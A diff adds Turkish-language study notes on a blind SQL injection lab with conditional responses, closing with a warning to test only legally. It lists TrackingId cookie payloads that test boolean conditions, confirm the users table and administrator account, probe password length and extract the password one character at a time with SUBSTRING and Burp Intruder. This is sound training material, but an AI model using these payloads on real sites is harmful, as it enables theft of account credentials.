@@ -205,3 +205,76 @@ Ayrıca, bu raporun açıklanmasını talep ettim ve bu talebim kabul edildi. Bu
 
 __________________________________________________________
 
+## Blind SQL injection with conditional responses
+
+### Kısa SQL Injection Notları:
+
+1. **Boolean Condition Testi:**
+   ```sql
+   TrackingId=xyz' AND '1'='1
+   ```
+   **Not:** "Welcome back" görünüyor mu? True bir koşul.
+
+   ```sql
+   TrackingId=xyz' AND '1'='2
+   ```
+   **Not:** "Welcome back" görünmüyorsa, False bir koşul.
+
+---
+
+2. **Tablo Kontrolü:**
+   ```sql
+   TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
+   ```
+   **Not:** "users" adında bir tablo var mı?
+
+---
+
+3. **Kullanıcı Kontrolü:**
+   ```sql
+   TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+   ```
+   **Not:** "administrator" adında bir kullanıcı var mı?
+
+---
+
+4. **Şifre Uzunluğu Testi:**
+   ```sql
+   TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+   ```
+   **Not:** Şifre uzunluğunu test etmek için LENGTH kullan.
+
+---
+
+5. **Şifre Uzunluğu Adım Adım:**
+   ```sql
+   TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
+   ```
+   **Not:** 3, 4, ... ile deneyerek maksimum uzunluğu bul.
+
+---
+
+6. **Şifre Karakter Testi (SUBSTRING):**
+   ```sql
+   TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+   ```
+   **Not:** İlk karakteri test eder. Burp Intruder ile tüm karakter setini dene.
+
+---
+
+7. **Payload ve Grep Kullanımı:**
+   - **Payload:** `a-z` ve `0-9` karakter aralığını ekle.
+   - **Grep - Match:** "Welcome back" ifadesini ara.
+   **Not:** Doğru karakter işaretlenir.
+
+---
+
+8. **Pozisyon Değiştirerek Şifre Bulma:**
+   ```sql
+   TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
+   ```
+   **Not:** Her karakter pozisyonu için aynı işlemi tekrar et. Offset değerini sırayla artır.
+
+---
+
+Bu adımları Burp Suite ile test ederek şifreyi adım adım elde edebilirsin. **Dikkat:** Yalnızca yasal test ortamlarında kullan!
